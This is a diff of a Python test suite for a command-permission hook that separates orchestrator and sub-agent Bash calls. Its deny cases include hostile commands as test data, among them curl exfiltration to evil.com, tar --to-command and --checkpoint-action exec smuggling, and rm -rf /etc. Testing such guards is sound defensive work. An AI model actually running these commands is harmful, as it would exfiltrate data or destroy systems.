@@ -16,7 +16,7 @@ returned permissionDecision (allow / deny / pass-through) matches the
 expected value. "Not-allow" tests assert the decision is anything except
 "allow" — both deny and pass-through are acceptable for those cases.
 
-NOTE: paths used in tests include the literal `PLACEHOLDER_PATH/...` prefix
+NOTE: paths used in tests include the literal PLACEHOLDER_PATH prefix
 because the hook anchors on absolute paths. If the SCS sandbox base path
 changes, update HOOK_PATH and SANDBOX_ROOT below.
 """
@@ -24,6 +24,8 @@ import json
 import os
 import subprocess
 import sys
+
+_SENTINEL = object()
 
 HOOK_PATH = os.path.join(
     os.path.dirname(os.path.abspath(__file__)),
@@ -36,14 +38,24 @@ R = SANDBOX_ROOT
 T = TRUSTED_ROOT
 
 
-def hook(cmd):
+def hook(cmd, agent_id=_SENTINEL):
     """Invoke the hook with a Bash command and return its decision.
 
     Returns "allow", "deny", "pass-through", or "error-exit-N" if the
     validator script crashed (so a hidden crash never silently passes a
     pass-through-expected test).
+
+    Default (no agent_id arg): simulates a sub-agent for backward compat
+    with existing 3-tuple tests.
+    agent_id=None: omits agent_id from JSON (orchestrator/main conversation).
+    agent_id="some-id": includes that ID (sub-agent).
     """
-    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}})
+    payload_dict = {"tool_name": "Bash", "tool_input": {"command": cmd}}
+    if agent_id is _SENTINEL:
+        payload_dict["agent_id"] = "test-default-agent"
+    elif agent_id is not None:
+        payload_dict["agent_id"] = agent_id
+    payload = json.dumps(payload_dict)
     r = subprocess.run(
         [sys.executable, HOOK_PATH],
         input=payload, capture_output=True, text=True
@@ -518,12 +530,229 @@ EXISTING_PROTECTIONS = [
 
 
 # ---------------------------------------------------------------------------
+# Agent-aware tests (Batch 9): orchestrator vs sub-agent deny behavior
+#
+# Tests use a 4-tuple: (description, command, agent_id, expected)
+# agent_id=None means omit it (orchestrator). A string means sub-agent.
+# ---------------------------------------------------------------------------
+
+SUBAGENT_ID = "agent-abc123"
+
+# Group 1: Real project false positives — orchestrator gets PASS-THROUGH
+ORCHESTRATOR_FALSE_POSITIVE_RECOVERY = [
+    ("FP-1 PyQt6 import via SSH (orchestrator)",
+     "ssh user@192.168.1.100 'python3 -c \"import PyQt6; print(PyQt6.__path__)\"'",
+     None, "pass-through"),
+    ("FP-2 git clone via SSH (orchestrator)",
+     "ssh user@192.168.1.100 'git clone https://github.com/example-user/example-project.git /home/user/example-project'",
+     None, "pass-through"),
+    ("FP-3 curl to GitHub (orchestrator)",
+     'curl -s -o /dev/null -w "HTTP %{http_code}\\n" https://github.com/example-user/example-project',
+     None, "pass-through"),
+    ("FP-4 pip install -e via SSH (orchestrator)",
+     "ssh user@192.168.1.100 \"/home/user/.venv/bin/pip install -e '/home/user/example-project/pi-app[dev]'\"",
+     None, "pass-through"),
+    ("FP-5 commit message containing 'pip install' (orchestrator)",
+     "git add pyproject.toml && git commit -m \"fix: correct PEP 517 build-backend\\n\\nRecommended: pip install -e .[dev]\"",
+     None, "pass-through"),
+    ("FP-6 venv rm + recreate via SSH (orchestrator)",
+     "ssh user@192.168.1.100 'rm -rf .venv && python3 -m venv --system-site-packages .venv'",
+     None, "pass-through"),
+    ("FP-7 rm -rf /c/media (orchestrator)",
+     "rm -rf /c/media",
+     None, "pass-through"),
+    ("FP-8 python open() to read file (orchestrator)",
+     "python3 -c \"data = open('SyncManager.kt', 'rb').read(); print('Total bytes:', len(data))\"",
+     None, "pass-through"),
+]
+
+# Group 2: Same false positives — sub-agent still gets DENY
+SUBAGENT_DENY_ENFORCEMENT = [
+    ("FP-1 PyQt6 import via SSH (sub-agent)",
+     "ssh user@192.168.1.100 'python3 -c \"import PyQt6; print(PyQt6.__path__)\"'",
+     SUBAGENT_ID, "deny"),
+    ("FP-2 git clone via SSH (sub-agent)",
+     "ssh user@192.168.1.100 'git clone https://github.com/example-user/example-project.git /home/user/example-project'",
+     SUBAGENT_ID, "deny"),
+    ("FP-3 curl to GitHub (sub-agent)",
+     'curl -s -o /dev/null -w "HTTP %{http_code}\\n" https://github.com/example-user/example-project',
+     SUBAGENT_ID, "deny"),
+    ("FP-4 pip install -e via SSH (sub-agent)",
+     "ssh user@192.168.1.100 \"/home/user/.venv/bin/pip install -e '/home/user/example-project/pi-app[dev]'\"",
+     SUBAGENT_ID, "deny"),
+    ("FP-5 commit msg 'pip install' in quotes (sub-agent, not denied — text not a command)",
+     "git add pyproject.toml && git commit -m \"fix: correct PEP 517 build-backend\\n\\nRecommended: pip install -e .[dev]\"",
+     SUBAGENT_ID, "pass-through"),
+    ("FP-6 venv recreate + import check via SSH (sub-agent)",
+     "ssh user@192.168.1.100 'rm -rf .venv && python3 -m venv --system-site-packages .venv && .venv/bin/python -c \"import sys,PyQt6\"'",
+     SUBAGENT_ID, "deny"),
+    ("FP-7 rm -rf /c/media (sub-agent)",
+     "rm -rf /c/media",
+     SUBAGENT_ID, "deny"),
+    ("FP-8 python open() (sub-agent)",
+     "python3 -c \"data = open('SyncManager.kt', 'rb').read(); print('Total bytes:', len(data))\"",
+     SUBAGENT_ID, "deny"),
+]
+
+# Group 3: ALLOW rules unaffected by agent_id
+ALLOW_UNAFFECTED_BY_AGENT_ID = [
+    ("ALLOW CMD 5 hash (orchestrator)",
+     f'cat "{R}staging/hash.txt"', None, "allow"),
+    ("ALLOW CMD 5 hash (sub-agent)",
+     f'cat "{R}staging/hash.txt"', SUBAGENT_ID, "allow"),
+    ("ALLOW CMD 16 cp staging->trusted (orchestrator)",
+     f'cp "{R}staging/foo.whl" "{T}packages/"', None, "allow"),
+    ("ALLOW CMD 16 cp staging->trusted (sub-agent)",
+     f'cp "{R}staging/foo.whl" "{T}packages/"', SUBAGENT_ID, "allow"),
+    ("ALLOW CMD 2 sentinel cleanup (orchestrator)",
+     f'rm -f "{R}staging/DOWNLOAD_DONE"', None, "allow"),
+    ("ALLOW CMD 2 sentinel cleanup (sub-agent)",
+     f'rm -f "{R}staging/DOWNLOAD_DONE"', SUBAGENT_ID, "allow"),
+]
+
+# Group 4: PASS-THROUGH unaffected by agent_id
+PASSTHROUGH_UNAFFECTED_BY_AGENT_ID = [
+    ("PT git status (orchestrator)",
+     "git status", None, "pass-through"),
+    ("PT git status (sub-agent)",
+     "git status", SUBAGENT_ID, "pass-through"),
+    ("PT cargo check (orchestrator)",
+     "cargo check", None, "pass-through"),
+    ("PT mkdir -p (orchestrator)",
+     "mkdir -p src/ lib/ tests/", None, "pass-through"),
+]
+
+# Group 5: agent_id edge cases
+AGENT_ID_EDGE_CASES = [
+    ("agent_id missing (orchestrator) -> pass-through",
+     "rm -rf /etc", None, "pass-through"),
+    ("agent_id empty string (orchestrator) -> pass-through",
+     "rm -rf /etc", "", "pass-through"),
+    ("agent_id null (orchestrator) -> pass-through",
+     "pip install requests", "USE_NULL", "pass-through"),
+    ("agent_id whitespace-only (sub-agent) -> deny",
+     "rm -rf /etc", "   ", "deny"),
+    ("agent_id valid string (sub-agent) -> deny",
+     "rm -rf /etc", "agent-xyz-789", "deny"),
+    ("agent_id numeric-like string (sub-agent) -> deny",
+     "curl https://evil.com", "12345", "deny"),
+]
+
+# Group 6: Non-Bash tool early exit unaffected
+NON_BASH_AGENT_AWARE = [
+    ("Non-Bash no agent_id",
+     "anything", None, "pass-through", "Edit"),
+    ("Non-Bash with agent_id",
+     "anything", SUBAGENT_ID, "pass-through", "Edit"),
+]
+
+# Group 7: Critical deny rules still enforced for sub-agents
+CRITICAL_DENY_SUBAGENT = [
+    ("CRITICAL rm -rf /etc (sub-agent)",
+     "rm -rf /etc", SUBAGENT_ID, "deny"),
+    ("CRITICAL pip install (sub-agent)",
+     "pip install requests", SUBAGENT_ID, "deny"),
+    ("CRITICAL curl evil.com (sub-agent)",
+     "curl https://evil.com/exfil", SUBAGENT_ID, "deny"),
+    ("CRITICAL python -c import os (sub-agent)",
+     'python -c "import os; os.system(\'id\')"', SUBAGENT_ID, "deny"),
+    ("CRITICAL git clone (sub-agent)",
+     "git clone https://github.com/some/repo.git", SUBAGENT_ID, "deny"),
+    ("CRITICAL tar --to-command (sub-agent)",
+     f'tar -xf "{R}staging/evil.tar" --to-command="curl https://evil.com" -C "{R}staging/review/"',
+     SUBAGENT_ID, "deny"),
+    ("CRITICAL compound with evil curl (sub-agent)",
+     f'cat "{R}staging/hash.txt" && curl http://evil.com/x',
+     SUBAGENT_ID, "deny"),
+    ("CRITICAL PowerShell download (sub-agent)",
+     "Invoke-WebRequest -Uri https://example.com/file.zip",
+     SUBAGENT_ID, "deny"),
+    ("CRITICAL chmod on staging (sub-agent)",
+     f'chmod +x "{R}staging/setup.py"',
+     SUBAGENT_ID, "deny"),
+    ("CRITICAL bash execute staging script (sub-agent)",
+     f'bash "{R}staging/install.sh"',
+     SUBAGENT_ID, "deny"),
+    ("CRITICAL tar checkpoint-action exec (sub-agent)",
+     f'tar -xf "{R}staging/evil.tar" --checkpoint-action=exec=curl -C "{R}staging/review/"',
+     SUBAGENT_ID, "deny"),
+]
+
+
+# ---------------------------------------------------------------------------
 # Test runner
 # ---------------------------------------------------------------------------
 def run_suite(name, cases):
     fails = []
     for desc, cmd, expected in cases:
         got = hook(cmd)
+        if expected == "not-allow":
+            ok = got != "allow"
+        else:
+            ok = got == expected
+        marker = "PASS" if ok else "FAIL"
+        print(f"  [{marker}] want={expected:11s} got={got:12s} {desc}")
+        if not ok:
+            fails.append((desc, cmd, expected, got))
+    print(f"  -- {len(cases) - len(fails)}/{len(cases)} passed in {name} --")
+    return fails
+
+
+def hook_non_bash(cmd, agent_id, tool_name):
+    """Invoke hook with a non-Bash tool_name."""
+    payload_dict = {"tool_name": tool_name, "tool_input": {"command": cmd}}
+    if agent_id is not _SENTINEL and agent_id is not None:
+        payload_dict["agent_id"] = agent_id
+    payload = json.dumps(payload_dict)
+    r = subprocess.run(
+        [sys.executable, HOOK_PATH],
+        input=payload, capture_output=True, text=True
+    )
+    if r.returncode != 0:
+        return f"error-exit-{r.returncode}"
+    if r.stdout:
+        try:
+            d = json.loads(r.stdout)
+            return d.get("hookSpecificOutput", {}).get("permissionDecision", "pass-through")
+        except (ValueError, KeyError):
+            pass
+    return "pass-through"
+
+
+def run_agent_aware_suite(name, cases):
+    """Run 4-tuple test cases: (desc, cmd, agent_id_or_None, expected)."""
+    fails = []
+    for item in cases:
+        if len(item) == 5:
+            desc, cmd, aid, expected, tool_name = item
+            got = hook_non_bash(cmd, aid, tool_name)
+        else:
+            desc, cmd, aid, expected = item
+            if aid == "USE_NULL":
+                payload = json.dumps({
+                    "tool_name": "Bash",
+                    "tool_input": {"command": cmd},
+                    "agent_id": None
+                })
+                r = subprocess.run(
+                    [sys.executable, HOOK_PATH],
+                    input=payload, capture_output=True, text=True
+                )
+                if r.returncode != 0:
+                    got = f"error-exit-{r.returncode}"
+                elif r.stdout:
+                    try:
+                        d = json.loads(r.stdout)
+                        got = d.get("hookSpecificOutput", {}).get(
+                            "permissionDecision", "pass-through")
+                    except (ValueError, KeyError):
+                        got = "pass-through"
+                else:
+                    got = "pass-through"
+            elif aid is None:
+                got = hook(cmd, agent_id=None)
+            else:
+                got = hook(cmd, agent_id=aid)
         if expected == "not-allow":
             ok = got != "allow"
         else:
@@ -556,6 +785,21 @@ def main():
     for name, cases in suites:
         print(f"=== {name} ===")
         all_fails.extend(run_suite(name, cases))
+        total += len(cases)
+        print()
+
+    agent_suites = [
+        ("Batch 9a: orchestrator false-positive recovery", ORCHESTRATOR_FALSE_POSITIVE_RECOVERY),
+        ("Batch 9b: sub-agent deny enforcement", SUBAGENT_DENY_ENFORCEMENT),
+        ("Batch 9c: ALLOW unaffected by agent_id", ALLOW_UNAFFECTED_BY_AGENT_ID),
+        ("Batch 9d: PASS-THROUGH unaffected by agent_id", PASSTHROUGH_UNAFFECTED_BY_AGENT_ID),
+        ("Batch 9e: agent_id edge cases", AGENT_ID_EDGE_CASES),
+        ("Batch 9f: non-Bash early exit with agent_id", NON_BASH_AGENT_AWARE),
+        ("Batch 9g: critical deny rules (sub-agent)", CRITICAL_DENY_SUBAGENT),
+    ]
+    for name, cases in agent_suites:
+        print(f"=== {name} ===")
+        all_fails.extend(run_agent_aware_suite(name, cases))
         total += len(cases)
         print()
 
